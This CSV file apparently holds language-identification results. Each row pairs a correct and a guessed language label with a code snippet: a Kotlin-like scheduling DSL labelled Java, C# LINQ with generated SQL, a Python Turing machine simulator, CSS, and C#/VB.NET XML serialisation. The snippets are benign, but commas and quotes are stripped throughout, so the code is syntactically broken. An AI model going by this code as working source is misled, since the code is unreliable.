correct,guess,snippet
Java,java,"schedule {    data {        startFrom(08:00)        subjects(Russian                Literature                Algebra                Geometry)        student {            name = Ivanov            subjectIndexes(0 2)        }        student {            name = Petrov            subjectIndexes(1 3)        }        teacher {           subjectIndexes(0 1)           availability {             monday(08:00)             wednesday(09:00 16:00)           }         }        teacher {            subjectIndexes(2 3)            availability {                thursday(08:00) + sameDay(11:00) + sameDay(14:00)            }        }        // data { } won't be compiled here because there is scope control with        // @DataContextMarker    } assertions {        for ((day lesson student teacher) in scheduledEvents) {            val teacherSchedule: Schedule = teacher.schedule            teacherSchedule[day lesson] shouldNotEqual null            teacherSchedule[day lesson]!!.student shouldEqual student            val studentSchedule = student.schedule            studentSchedule[day lesson] shouldNotEqual null            studentSchedule[day lesson]!!.teacher shouldEqual teacher        }    }}"
SQL,sql,"            using (var rep = new Repository())            {               ISqlQueriable<User> users = rep.Get<User>().Where(x =>               (x.Role.Name.EndsWith(SuperAdmin) &&                x.UserName.Contains(alen)) ||                x.Address.Any(a => (a.AddressName.StartsWith(st) ||                a.AddressName.Contains(mt))).                Skip(20).Take(100).Execute();                  );                                List<User> userList = users.Execute();                var sql = users.ParsedLinqToSql;            }                        // And here is the generated SQL Query             SELECT distinct Users.* FROM Users              left join [Roles] CEjB on CEjB.[Id] = Users.[Role_Id]             WHERE (([CEjB].[Name] like String[%SuperAdmin]              AND [Users].[UserName] like String[%alen%])              OR  EXISTS (SELECT 1 FROM [Address]              INNER JOIN [Address] MJRhcYK on Users.[Id] = MJRhcYK.[User_Id]             WHERE (([Address].[AddressName] like String[st%] OR              [Address].[AddressName] like String[%mt%]))))             ORDER BY Id             OFFSET 20             ROWS FETCH NEXT 100 ROWS ONLY;             // All String[] and Date[] will be translated to Parameters later on.  "
Python,python,"def _log_process(self step):    print('\nTape after step {0}: '.format(step))    print('[' end='')    for i in range(0 self.tape.get_length()):        if self.tape.head_position == i:            print(\033[4m + self.tape._tape[i] + \033[0m end='')        else:            print(self.tape._tape[i] end='')    print(']')"
Python,python,"tape = Tape('|||' '|')states = [            State(s0 StateType.Start)            State(s1 StateType.Empty)            State(s2 StateType.Empty)            State(sf StateType.Final)         ]transitions = [                 Transition(s0 $ s1 $ Direction.Right)                 Transition(s1 | s1 | Direction.Right)                 Transition(s1 # s2 # Direction.Left)                 Transition(s2 $ sf $ Direction.Neutral)                 Transition(s2 | sf # Direction.Neutral)              ]tm = TuringMachine(states transitions tape)tm.process(True)"
Python,python,"tape = Tape('|||&||' '|&')states = [            State(s0 StateType.Start)            State(s1 StateType.Empty)            State(s2 StateType.Empty)            State(s3 StateType.Empty)            State(s4 StateType.Empty)            State(sf StateType.Final)         ]transitions = [                 Transition(s0 $ s1 $ Direction.Right)                 Transition(s1 # sf # Direction.Neutral)                 Transition(s1 | s1 | Direction.Right)                 Transition(s1 & s2 | Direction.Right)                 Transition(s2 | s2 | Direction.Right)                 Transition(s2 # s3 # Direction.Left)                 Transition(s3 | s4 # Direction.Left)                 Transition(s4 | s4 | Direction.Left)                 Transition(s4 $ sf $ Direction.Neutral)              ]tm = TuringMachine(states transitions tape)tm.process(True)"
Python,python,"tape = Tape('|||#||' '|&')states = [            State(s0 StateType.Start)            State(s1 StateType.Empty)            State(s2 StateType.Empty)            State(s3 StateType.Empty)            State(s4 StateType.Empty)            State(s5 StateType.Empty)            State(s6 StateType.Empty)            State(s7 StateType.Empty)            State(s8 StateType.Empty)            State(sf StateType.Final)         ]transitions = [                 Transition(s0 $ s0 $ Direction.Right)                 Transition(s0 # sf # Direction.Neutral)                 Transition(s0 | s1 | Direction.Right)                 Transition(s1 | s1 | Direction.Right)                 Transition(s1 # s2 # Direction.Right)                 Transition(s2 # s2 # Direction.Right)                 Transition(s2 | s3 | Direction.Right)                 Transition(s3 | s4 | Direction.Left)                 Transition(s3 # s6 # Direction.Left)                 Transition(s4 | s5 # Direction.Left)                 Transition(s5 # s5 # Direction.Left)                 Transition(s5 | s2 # Direction.Right)                 Transition(s5 $ s2 $ Direction.Right)                 Transition(s6 | s7 # Direction.Left)                 Transition(s7 # s7 # Direction.Left)                 Transition(s7 $ sf $ Direction.Neutral)                 Transition(s7 | s8 # Direction.Left)                 Transition(s8 | s8 | Direction.Left)                 Transition(s8 $ sf $ Direction.Neutral)              ]tm = TuringMachine(states transitions tape)tm.process(True)"
CSS,css,".centerScreen {  text-align: center;  display: block;  position: absolute;  z-index: 1;  width: 100%;  }.title {  top: 20%;  color: green;  font-size: 80px;}.pressSpace {  top: 35%;  font-size: 20px;  color: #ffffff;}"
Python,python,"from direction import Directionclass Tape:    def __init__(self word alphabet):        self.alphabet = alphabet + $#                self.head_position = 0        self.__init_tape(word)    def __init_tape(self word):        tape = $;        for char in (c for c in word if c in self.alphabet):            tape += char        tape += #;        self._tape = list(tape)    def write(self character):        if self.head_position < 1 or character not in self.alphabet:            return        self._tape[self.head_position] = character        last_item_index = len(self._tape) - 1        if self.head_position == last_item_index:            self._tape += '#'    def read(self):        if self.head_position < 0 or self.head_position > len(self._tape) - 1:            raise Exception('Trying to read character at invalid position: ' + self.head_position)        return self._tape[self.head_position]    def get_tape(self):        self._remove_trailing_sharps()        return ''.join(self._tape)    def move_head(self direction):        if direction == Direction.Right:            self.head_position += 1        elif direction == Direction.Left:            self.head_position -= 1        if self.head_position > len(self._tape) - 1:            self._tape += '#'        if self.head_position < 0:            self.head_position = 0    def get_length(self):        return len(self._tape)    def _remove_trailing_sharps(self):        for i in range(len(self._tape) - 1 1 -1):            if self._tape[i] == '#' and self._tape[i-1] == '#':                del self._tape[-1:]            else:                break"
Python,python,"from state import Stateclass Transition:    def __init__(self current_state current_char new_state new_char direction):        self.current_state = current_state        self.current_char = current_char        self.new_state = new_state        self.new_char = new_char        self.direction = direction"
Python,python,"from state import StateTypeclass TuringMachine:    def __init__(self states transitions tape):        self.states = states        self.start_state = self.get_start_state()        self.transitions = transitions        self.tape = tape    def get_tape(self):        return self.tape.get_tape()    def get_start_state(self):        return next(state for state in self.states if state.type == StateType.Start)    def process(self verbose=False):        current_state = self.start_state        while current_state.type != StateType.Final:            current_char = self.tape.read()            state_id = current_state.id            transition = next(t for t in self.transitions                              if t.current_state == state_id                              and t.current_char == current_char)            current_state = next(state for state in self.states if state.id == transition.new_state)            self.tape.write(transition.new_char)            self.tape.move_head(transition.direction)"
Python,python,"from turing_machine import TuringMachinefrom state import State StateTypefrom transition import Transitionfrom direction import Directionfrom tape import Tapetape = Tape('|||' '|')states = [            State(s0 StateType.Start)            State(s1 StateType.Empty)            State(sf StateType.Final)         ]transitions = [                 Transition(s0 $ s1 $ Direction.Right)                 Transition(s1 | s1 | Direction.Right)                 Transition(s1 # sf | Direction.Neutral)              ]tm = TuringMachine(states transitions tape)tm.process();print(tm.get_tape())"
C#,c#,"var rootModel = new ModelRoot(My Test Tree);    rootModel.RootItems.Add(makeTree());                     // Create tree in-memory    string result = null;    XmlSerializer serializer = new XmlSerializer(typeof(ModelRoot));    using (StreamWriter writer = new StreamWriter(@data.xml))  // Write Xml to file////    using (var writer = new StringWriter())                  // Write Xml to string    {      serializer.Serialize(writer rootModel);      result = writer.ToString();                // Convert result to string to read below    }        ModelRoot resultTree = null;                        // Re-create tree from XML    using (var reader = XmlReader.Create(@data.xml)) // Read Xml Data from file////    using (var reader = new StringReader(result)) // Read Xml Data from string    {      XmlSerializer deserializer = new XmlSerializer(typeof(ModelRoot));      resultTree = (ModelRoot) deserializer.Deserialize(reader);    }        Console.WriteLine(Debug Deserialized XML for {0} resultTree);    var items = TreeLib.BreadthFirst.Traverse.LevelOrder(resultTree.RootItems i => i.Children);    foreach (var item in items)    {      Console.WriteLine(Level: {0} Node: '{1}' item.Level item.Node);    }"
VB.NET,vb.net,"Dim rootModel = New ModelRoot(My Test Tree) ' Create tree in-memoryrootModel.RootItems.Add(makeTree())Dim result As String = Nothing                ' Write Xml to fileDim serializer As XmlSerializer = New XmlSerializer(GetType(ModelRoot))Using writer As StreamWriter = New StreamWriter(data.xml)''''    using writer = New StringWriter()                  ' Write Xml to string    serializer.Serialize(writer rootModel)    result = writer.ToString() ' Convert result to string to read belowEnd UsingDim resultTree As ModelRoot = Nothing        ' Re-create tree from XMLUsing reader = XmlReader.Create(data.xml)  ' Read Xml Data from file''''    using reader = New StringReader(result) ' Read Xml Data from string    Dim deserializer As XmlSerializer = New XmlSerializer(GetType(ModelRoot))    resultTree = CType(deserializer.Deserialize(reader) ModelRoot)End UsingConsole.WriteLine(Deserialized XML for {0} resultTree)Dim items = TreeLib.BreadthFirst.Traverse.LevelOrder(resultTree.RootItems Function(i) i.Children)For Each item In items    Console.WriteLine(Level: {0} Node: '{1}' item.Level item.Node)Next"
C#,c#,"public class Node{   private Node _Parent = null;   public string Id      { get; set; }      public List<node> Children  { get; set; }   [XmlIgnore]   public Node Parent   {     get     {       return _Parent;     }          set     {       if (_Parent != value)       {         _Parent = value;                  if (_Parent != null)           ParentId = _Parent.Id;         else           ParentId = string.Empty;       }            }   }   public string ParentId      { get; set; }}</node>"
VB.NET,vb.net,"Public Class Node    Private _Parent As Node = Nothing    Public Property Id As String    Public Property Children As List(Of Node)        <xmlignore>    Public Property Parent As Node        Get            Return _Parent        End Get        Set(ByVal value As Node)            If _Parent <> value Then                _Parent = value                If _Parent IsNot Nothing Then ParentId = _Parent.Id Else ParentId = String.Empty            End If        End Set    End Property    Public Property ParentId As StringEnd Class</xmlignore>"
C#,c#,"public class XmlStorage{  public static string WriteXmlToString<t>(T rootModel)  {    using (var writer = new StringWriter())     // Write Xml to string    {      XmlSerializer serializer = new XmlSerializer(typeof(T));      serializer.Serialize(writer rootModel);      return writer.ToString();                // Convert result to string to read below    }  }  public static void WriteXmlToFile<t>(string filename T rootModel)  {    using (StreamWriter writer = new StreamWriter(filename))  // Write Xml to file    {      XmlSerializer serializer = new XmlSerializer(typeof(T));      serializer.Serialize(writer rootModel);    }  }  public static T ReadXmlFromString<t>(string input)  {    using (var reader = new StringReader(input))   // Read Xml Data from string    {      XmlSerializer deserializer = new XmlSerializer(typeof(T));      return (T) deserializer.Deserialize(reader);    }  }    public static T ReadXmlFromFile<t>(string filename)  {    using (var reader = XmlReader.Create(filename))    // Read Xml Data from file    {      XmlSerializer deserializer = new XmlSerializer(typeof(T));      return (T)deserializer.Deserialize(reader);    }  }}</t></t></t></t>"
VB.NET,vb.net,"Public Class XmlStorage  ' Write Xml to String  Public Shared Function WriteXmlToString(Of T)(ByVal rootModel As T) As String    Using writer = New StringWriter()      Dim serializer As XmlSerializer = New XmlSerializer(GetType(T))      serializer.Serialize(writer rootModel)      Return writer.ToString()    End Using  End Function  ' Write Xml to file  Public Shared Sub WriteXmlToFile(Of T)(ByVal filename As String ByVal rootModel As T)    Using writer As StreamWriter = New StreamWriter(filename)      Dim serializer As XmlSerializer = New XmlSerializer(GetType(T))      serializer.Serialize(writer rootModel)    End Using  End Sub  ' Read Xml from String  Public Shared Function ReadXmlFromString(Of T)(ByVal input As String) As T    Using reader = New StringReader(input)      Dim deserializer As XmlSerializer = New XmlSerializer(GetType(T))      Return CType(deserializer.Deserialize(reader) T)    End Using  End Function  ' Read Xml from file  Public Shared Function ReadXmlFromFile(Of T)(ByVal filename As String) As T    Using reader = XmlReader.Create(filename)      Dim deserializer As XmlSerializer = New XmlSerializer(GetType(T))      Return CType(deserializer.Deserialize(reader) T)    End Using  End FunctionEnd Class"
